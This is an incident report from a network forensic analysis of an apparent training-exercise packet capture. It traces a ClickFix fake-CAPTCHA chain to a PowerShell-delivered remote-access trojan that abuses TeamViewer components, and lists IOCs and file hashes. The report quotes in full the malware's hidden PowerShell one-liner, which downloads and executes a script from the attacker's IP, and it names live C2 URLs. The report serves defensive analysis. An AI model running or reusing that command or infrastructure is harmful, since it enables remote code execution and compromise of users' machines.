# Incident Report — Network Forensic Analysis
**Case:** mta-2025-01-22 | **Evidence:** `2025-01-22-traffic-analysis-exercise.pcap` (39,427 frames, 26.1 MB, ~43.5 min capture, no alert/log files provided alongside the pcap)

## Victim Host

| Attribute | Value | Source |
|---|---|---|
| IPv4 | 10.1.17.215 | conversations, ARP |
| MAC | 00:d0:b7:26:4a:74 | ARP (`arp.src.proto_ipv4==10.1.17.215`) |
| Windows hostname | DESKTOP-L8C5GSJ | DHCP option 12, NBNS, Kerberos CNameString (`DESKTOP-L8C5GSJ$`) |
| Domain/workgroup | BLUEMOONTUESDAY | NBNS |
| Logged-in user | shutchenson | Kerberos AS-REQ CNameString from 10.1.17.215 to DC 10.1.17.2 |

## Malware Family

**Attribution: behavioral, not signature-confirmed** (no IDS/Suricata export was present in the evidence set — only the pcap).

Infection chain observed:
1. **ClickFix-style delivery.** Victim's browser resolves `google-authenticator.burleson-appliance.net` → redirects through **`authenticatoor.org`** (82.221.136.26, fake "human verification" / Google-Authenticator lure page) → `appointedtimeagriculture.com` (217.70.186.109), all inside a ~14-second window (t=38s–52s).
2. At t=60.3s, the host issues `GET /api/file/get-file/264872` to **5.252.153.241** (bare-IP HTTP, no DNS lookup preceded it — hardcoded C2 IP) with a spoofed IE7 user-agent. The returned object (SHA256 `c74123dbccded43fda61651e102750b041d4c3af6fda88cd6436f9276653e103`) is an HTA/VBScript component that launches:
   ```
   powershell -NoProfile -WindowStyle Hidden -Command "start-process 'https://azure.microsoft.com';
   iex (new-object System.Net.WebClient).DownloadString('http://5.252.153.241:80/api/file/get-file/29842.ps1')"
   ```
   (decoy `start-process` to a legitimate Microsoft URL is used to mask the malicious action from the user.)
3. `29842.ps1` (SHA256 `b8ce40900788ea26b9e4c9af7efab533e8d39ed1370da09b93fcf72a16750ded`) is a Base64-wrapped PowerShell loader; the decoded payload is opaque/encrypted binary (519 bytes), consistent with a second-stage loader stub, not directly readable.
4. The host then pulls **`pas.ps1`** (SHA256 `a833f27c2bb4cad31344e70386c44b5c221f031d7cd2f2a6b8601919e790161e`, structurally identical loader) and three files served under names impersonating legitimate remote-access software: **`TeamViewer`** (4,380,968 bytes, SHA256 `904280f20d697d876ab90a1b74c0f22a83b859e8b0519cb411fda26f1642f53e`), **`Teamviewer_Resource_fr`** (668,968 bytes, SHA256 `9634ecaf469149379bba80a745f53d823948c41ce4e347860701cbdff6935192`), and **`TV`** (a PE32 DLL, 12,920 bytes, SHA256 `3448da03808f24568e6181011f8521c0713ea6160efd05bff20c43b091ff59f7`).
5. Post-infection check-ins to `5.252.153.241:80/1517096937` report operator-visible status strings: `message = startup shortcut created; status = success` and `script: RunRH, status: OK, message: PS process started` — confirming the payload installs persistence (startup shortcut) and drives the deployed TeamViewer components for hands-on-keyboard remote access.
6. A separate, long-lived (28.7-minute, t=889s–2610s) TLS session opens to **45.125.66.32:2917**, presenting a self-signed certificate with CN `45.125.66.32: Self-signed certificate` — a second, independent C2/RAT channel on a non-standard port, consistent with the beaconing seen to the .241 checkin server but on a distinct infrastructure node.

This is a **ClickFix fake-CAPTCHA delivery chain leading to a PowerShell-deployed remote-access trojan that abuses/trojanizes legitimate TeamViewer components for control**, with a secondary custom-port TLS C2 channel. No signature (Suricata/IDS) evidence was available to name a specific tracked family with certainty — the above is traffic-behavior attribution only.

## Indicators of Compromise (all grounded in this capture)

**C2 endpoints:**
- `5.252.153.241:80` — initial payload delivery + persistent HTTP check-in beacon (`GET /1517096937` every ~5s from t=62s to t=610s)
- `45.125.66.32:2917` — secondary long-lived TLS C2/RAT channel (self-signed cert, t=889s–2610s)

**Malicious domains:**
- `authenticatoor.org` (resolves to 82.221.136.26) — fake CAPTCHA/ClickFix lure page
- `google-authenticator.burleson-appliance.net` — lure/redirect entry point
- `appointedtimeagriculture.com` (resolves to 217.70.186.109) — redirect-chain hop

**Malicious URLs:**
- `http://5.252.153.241/api/file/get-file/264872` (HTA/VBScript dropper)
- `http://5.252.153.241:80/api/file/get-file/29842.ps1` (PowerShell loader)
- `http://5.252.153.241/api/file/get-file/pas.ps1` (PowerShell loader)
- `http://5.252.153.241/api/file/get-file/TeamViewer`
- `http://5.252.153.241/api/file/get-file/Teamviewer_Resource_fr`
- `http://5.252.153.241/api/file/get-file/TV`
- `http://5.252.153.241/1517096937` (C2 beacon/check-in, seen with `?k=` status messages)

**Transferred files / hashes (SHA256):**
| File | SHA256 |
|---|---|
| 264872 (HTA/VBScript dropper) | c74123dbccded43fda61651e102750b041d4c3af6fda88cd6436f9276653e103 |
| 29842.ps1 (PowerShell loader) | b8ce40900788ea26b9e4c9af7efab533e8d39ed1370da09b93fcf72a16750ded |
| pas.ps1 (PowerShell loader) | a833f27c2bb4cad31344e70386c44b5c221f031d7cd2f2a6b8601919e790161e |
| TeamViewer | 904280f20d697d876ab90a1b74c0f22a83b859e8b0519cb411fda26f1642f53e |
| Teamviewer_Resource_fr | 9634ecaf469149379bba80a745f53d823948c41ce4e347860701cbdff6935192 |
| TV (PE32 DLL) | 3448da03808f24568e6181011f8521c0713ea6160efd05bff20c43b091ff59f7 |

**Benign context (not indicators):** traffic to Microsoft/Windows telemetry, NCSI, Bing/MSN, ad-tech domains, and legitimate `master16.teamviewer.com` (185.188.32.26) DynGate lookups seen at t≈611s — this is the trojanized TeamViewer client checking in with legitimate TeamViewer infrastructure after install, not attacker infrastructure.
